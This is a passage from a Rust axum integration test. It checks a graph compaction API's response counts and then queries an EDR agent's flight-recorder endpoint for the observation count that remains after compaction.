        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read graph compaction response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode graph compaction response: {e}"));
        assert_eq!(payload["dryRun"], false);
        assert_eq!(payload["candidateCount"], 1);
        assert_eq!(payload["removedCount"], 1);
        assert_eq!(payload["retainedCount"], 2);

        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/edr/flight-recorder")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build compacted flight recorder request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("compacted flight recorder request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read compacted flight recorder: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode compacted flight recorder: {e}"));
        assert_eq!(payload["observation_count"], 2);
    }

